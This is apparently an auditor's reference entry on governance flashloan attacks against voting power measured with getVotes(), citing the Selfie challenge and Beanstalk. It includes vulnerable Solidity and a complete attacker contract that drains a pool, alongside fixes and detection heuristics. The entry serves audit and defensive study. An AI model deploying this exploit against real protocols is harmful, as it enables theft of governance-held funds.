# Pattern: Governance Flashloan Attack via Current-State Voting Power

Voting power measured at the moment of propose (current state, not historical) can
be inflated transiently via flashloan; the timelock doesn't help because execute
doesn't re-verify.

**Family:** Governance / Voting Power Timing Attack
**Exploitation chain:** flashloan → delegate(self) → queueAction → repay → warp → executeAction → drain

**Reference example:** Damn Vulnerable DeFi v4 — Selfie; Beanstalk (2022, production)
**Severity when present:** Critical (total drain of governance-controlled funds)
**Detection by Slither/Aderyn:** NO
**Solodit tags:** governance, flashloan, voting-power, snapshot, erc20votes, getVotes, getPastVotes, governance-flashloan-attack

---

## Core mechanism

A governance that measures voting power with `getVotes(account)` (the current state of the
latest delegation checkpoint) instead of `getPastVotes(account, pastBlock)`
(the state at a fixed earlier block) is vulnerable to temporal manipulation.

`ERC20Votes.getVotes(account)` returns the most recent checkpoint — it immediately
reflects any change in delegation or balance. If the protocol exposes
a flashloan of the same governance token, the attacker can:

1. Borrow the governance token massively (in a single tx)
2. Call `delegate(self)` → `getVotes(self)` exceeds the proposal threshold
3. Call `queueAction(malicious_call)` → the proposal is recorded
4. Repay the flashloan → `getVotes(self)` goes back to 0
5. Wait out the timelock (days/weeks)
6. Call `executeAction(id)` → execute does NOT re-verify voting power

The timelock does not mitigate the attack because its purpose is to give the community time
to react, not to verify that the proposer still holds the power.

---

## Minimal vulnerable pattern

```solidity
// VULNERABLE: uses getVotes() (current)
function _hasEnoughVotes(address who) private view returns (bool) {
    uint256 balance = _votingToken.getVotes(who);           // ← current checkpoint
    uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
    return balance > halfTotalSupply;
}

function queueAction(address target, uint128 value, bytes calldata data)
    external returns (uint256 actionId)
{
    if (!_hasEnoughVotes(msg.sender)) revert NotEnoughVotes(msg.sender);
    // ... records the action with proposedAt = block.timestamp
}

function executeAction(uint256 actionId) external payable returns (bytes memory) {
    if (!_canBeExecuted(actionId)) revert CannotExecute(actionId);
    // ... executes without re-verifying votes
}
```

```solidity
// The governance token is also the flashloan pool's asset
contract VulnerablePool {
    IERC20 public token; // same token the governance uses

    function flashLoan(...) external nonReentrant {
        // nonReentrant only protects this contract, not the external governance
        token.transfer(receiver, amount);
        receiver.onFlashLoan(...);
        token.transferFrom(receiver, address(this), amount);
    }

    function drain(address receiver) external onlyGovernance {
        token.transfer(receiver, token.balanceOf(address(this)));
    }
}
```

---

## Required conditions

Three conditions must hold simultaneously:

1. **Voting power measured with `getVotes()` (current) in `queueAction`** — not with `getPastVotes()`
2. **`delegate()` (or equivalent) callable with no timing restriction** — immediate update
3. **A source of governance-token liquidity accessible to the attacker** — a flashloan from the pool itself,
   or any other source (Aave, Balancer) that lends the governance token

Condition 3 does not require the source to be the pool itself — any external flashloan of the governance
token is enough if the attacker can obtain more than the voting threshold.

---

## Canonical exploitation (multi-tx, not end-to-end atomic)

```solidity
contract GovernanceAttacker is IERC3156FlashBorrower {
    bytes32 private constant CALLBACK_SUCCESS =
        keccak256("ERC3156FlashBorrower.onFlashLoan");

    VulnerablePool pool;
    SimpleGovernance governance;
    IERC20 token;
    address recovery;
    uint256 public actionId;

    function attack() external {
        // Tx 1: borrow the whole pool, delegate, propose, repay
        pool.flashLoan(this, address(token), pool.maxFlashLoan(address(token)), "");
    }

    function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata)
        external returns (bytes32)
    {
        // Inside the flashloan tx:
        token.delegate(address(this));          // getVotes(this) > threshold ✓
        actionId = governance.queueAction(      // proposal recorded
            address(pool), 0,
            abi.encodeCall(pool.drain, (recovery))
        );
        token.approve(address(pool), amount);   // authorize repayment
        return CALLBACK_SUCCESS;
    }

    function completeAttack() external {
        // Tx 2: after the timelock
        governance.executeAction(actionId);     // no re-verification of votes ✓
    }
}

// In the test:
// attacker.attack();
// vm.warp(block.timestamp + timelockDelay);
// attacker.completeAttack();
```

**Why it is not end-to-end atomic:** the timelock is a real delay that must
pass between `queueAction` and `executeAction`. Tx1 (flashloan+propose) and Tx2 (execute)
are separate transactions. In tests: `vm.warp(+timelockDelay)` between them.

---

## Mitigations

### Correct fix: `getPastVotes()` instead of `getVotes()`

```solidity
// CORRECT: uses getPastVotes() with the block before the propose
function _hasEnoughVotes(address who) private view returns (bool) {
    uint256 balance = _votingToken.getPastVotes(who, block.number - 1);
    uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
    return balance > halfTotalSupply;
}
```

`getPastVotes(who, block.number - 1)` returns the votes at the previous block — an already
mined state the attacker cannot modify in the current transaction. A flashloan that
acquires tokens and delegates in the same block does not change the previous block.

This is the **OZ Governor** approach: `proposalSnapshot()` stores `block.number` at
the moment of the propose, and votes are measured with `getPastVotes(voter, proposalSnapshot)`.

### Alternative fix: minimum holding period

Require the delegatee to have held the voting power for N blocks/seconds before
being able to propose. More complex to implement correctly; `getPastVotes` is the
canonical solution.

### Not a fix: `nonReentrant` on `queueAction`

`nonReentrant` on `queueAction` does NOT mitigate the attack because the attacker does not re-enter
`queueAction` — they call `queueAction` from the flashloan callback in the pool, which
is a different contract. The reentrancy lock is local to the contract where it is declared.

`nonReentrant` on `flashLoan` does NOT mitigate it EITHER — the lock protects against re-entry into
SelfiePool, but the attack does not re-enter the pool. The callback calls
`governance.queueAction()`, which lives in another contract. SelfiePool's lock does not
propagate to SimpleGovernance. Selfie has exactly this modifier on `flashLoan` and
the attack goes through anyway.

---

## Detection heuristic

Red flags in code review:

- Governance uses `getVotes(account)` in `queueAction` or the proposal function
- The protocol exposes a flashloan of the governance token (same token)
- `executeAction` does not re-verify voting power
- `delegate()` with no timing restriction or cooldown

Key question: **"Is it `getVotes()` or `getPastVotes()`?"** If it is `getVotes()`, look for
a source of governance-token liquidity and model the flashloan attack.

---

## Cross-references

### Historical canon

**Beanstalk ($182M, 2022)** — the same mechanism in real production.
See [../historical-exploits.md](../historical-exploits.md), Beanstalk entry:
"Voting power = current token balance. The attacker borrowed tokens via a flashloan,
voted for a malicious proposal, executed it (transferred funds), repaid."

### Meta-family: "Validation without context"

This pattern shares a broad conceptual family with:

- [flashloan-repayment-balance-conflation.md](flashloan-repayment-balance-conflation.md) —
  repayment validation that ignores the **source** of the funds
- [erc4626-totalassets-balanceof.md](erc4626-totalassets-balanceof.md) —
  `totalAssets()` that ignores the **source** of the funds in the vault

The difference: in this family, the protocol ignores the **timing** of voting power
(it is measured now, but should be measured at a fixed earlier block). In the other two, the
protocol ignores the **source/purpose** of the funds. They are distinct sub-families under
the meta-pattern "validation without sufficient context".

Do NOT merge with the above — the root vulnerability and the fix are different.

### Known instances

| Instance | Date | Ref |
|-----------|-------|-----|
| Damn Vulnerable DeFi v4 — Selfie | — | training challenge |
| Beanstalk | 2022 (production) | [historical-exploits.md](../historical-exploits.md) |
